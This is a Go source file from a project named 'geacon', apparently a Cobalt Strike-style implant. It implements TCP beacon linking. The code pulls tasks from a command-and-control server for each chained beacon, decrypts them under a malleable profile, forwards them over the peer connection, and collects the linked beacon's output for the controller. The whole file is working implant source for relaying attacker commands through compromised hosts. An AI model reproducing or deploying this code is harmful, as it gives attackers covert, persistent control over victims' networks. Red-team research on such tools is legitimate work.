package packet

import (
	"fmt"
	"geacon/cmd/config"
	"net"
	"time"
	"errors"
	"syscall"
	"bufio"
	"bytes"
)

func AddTcpBeaconLink(id int, conn net.Conn, ppid int, encryptedMetaInfo []byte) {
	fmt.Printf("Adding beacon with ID %d to the list of connected beacons\n", id)
	config.TcpBeacons = append(config.TcpBeacons, config.TcpBeacon{id, conn, ppid, encryptedMetaInfo})
}

func CheckTcpBeacons() []byte {
	// checking all tcp beacons known and returning their output

	resultBuf := make([]byte, 0, 90000)

	for _, beacon := range config.TcpBeacons {
		// checking if the beacon has any new tasks
		resp := PullChainCommand(beacon.EncryptedMetaInfo)
		// remove any encryption layer provided by our malleable profile
		taskDecrypted := ProfileDecryptPacket(resp.Bytes())
		// check if the length is greater than zero
		if len(taskDecrypted) > 0 {
			fmt.Printf("Beacon %d received tasks (length is %d), sending to beacon...\n", beacon.Id, len(taskDecrypted))
			bytesLen := WriteLittleInt(len(taskDecrypted))
			fmt.Printf("Length is [%x] in current endianness, converted will be [%x]\n", len(taskDecrypted), bytesLen)
			// send the length of bytes the beacon should expect
			beacon.Conn.Write(bytesLen)
			time.Sleep(50 * time.Millisecond)
			beacon.Conn.Write(taskDecrypted)
			fmt.Printf("Sent tasks to beacon %d\n", beacon.Id)
		}
		time.Sleep(200 * time.Millisecond)

		// now collecting any output of the beacon
		fmt.Printf("Reading data from beacon with ID %d\n", beacon.Id)
		// Sending 0x00 0x00 0x00 0x00 to query beacon to checkin, response will be 1. length of response to await (4 bytes), 2. answer

		beacon.Conn.Write([]byte{00, 00, 00, 00})
		time.Sleep(50 * time.Millisecond)
		// reading length of data to expect
		var beaconOutputBuf []byte
		messageLengthByte := make([]byte, 4)		
		reader := bufio.NewReader(beacon.Conn)

		bytesRead, err := beacon.Conn.Read(messageLengthByte)
		if err != nil {
			if errors.Is(err, syscall.ECONNRESET) {
				fmt.Printf("This is connection reset by peer error\n")
			}
			processErrorTest(68, 0, 0, err.Error())
			// panic(err)
		}
		if CheckSliceNull(messageLengthByte) {
			break
		}
		messageLength := ReadLittleInt(messageLengthByte)
		fmt.Printf("Read %d Bytes.\nMessage length to expect is %d [%x]\n", bytesRead, messageLength, messageLengthByte)

		if messageLength > 0 {
			for {
				beaconOutput := make([]byte, 25000)
				n, err := reader.Read(beaconOutput)
				if err != nil {
					fmt.Println("read error:", err)
				}
				beaconOutput = beaconOutput[:n]

				if CheckSliceNull(beaconOutput[len(beaconOutput)-4:len(beaconOutput)-1]) {
					fmt.Printf("Cutting a bit off at the end...")
					beaconOutput = bytes.TrimSuffix(beaconOutput, []byte{00, 00, 00, 00})
				}
				// fmt.Printf("Read %d Bytes.\n\n\n", n)
				fmt.Printf("Read %d Bytes.\nMessage is %x\n\n", n, beaconOutput)

	
				// PushChainResult(beacon.Id, EncryptPacket(beaconOutput))
				// encryptedBeaconOutput := EncryptPacket(beaconOutput)
				beaconOutputBuf = append(beaconOutputBuf, beaconOutput...)
				if len(beaconOutputBuf) == int(messageLength) {
					break
				}
			}
					
		} else {
			fmt.Printf("Beacon %d is only checking in, nothing to see here\n", beacon.Id)
		}
		beaconOutputFinal := MakePacket(BEACON_RSP_BEACON_CHECKIN, append(WriteInt(beacon.Id), beaconOutputBuf...))
		resultBuf = append(resultBuf, beaconOutputFinal...)
		// PushChainResult(beacon.Id, EncryptPacket(beaconOutputBuf))

	}
	return resultBuf
}

func SendLinkPacket(beaconId uint32, message []byte) {
	// get the beacon link we actually want
	for i := range config.TcpBeacons {
    if config.TcpBeacons[i].Id == int(beaconId) {
			// Found!
			// we only send data, reading a response will happen the next time we check in with that beacon either way
			beacon := config.TcpBeacons[i]
			messageLen := WriteLittleInt(len(message))
			fmt.Printf("Length is [%x] in current endianness, converted will be [%x]\n", len(message), messageLen)
			beacon.Conn.Write(messageLen)
			time.Sleep(50 * time.Millisecond)
			beacon.Conn.Write(message)
			fmt.Printf("Sent tasks to beacon %d\n", beacon.Id)
    }
}
}

func CheckSliceNull(b []byte) bool {
	nullSlice := []byte{00, 00, 00, 00}
	for i, v := range b {
        if v != nullSlice[i] {
            return false
        }
    }
    return true
}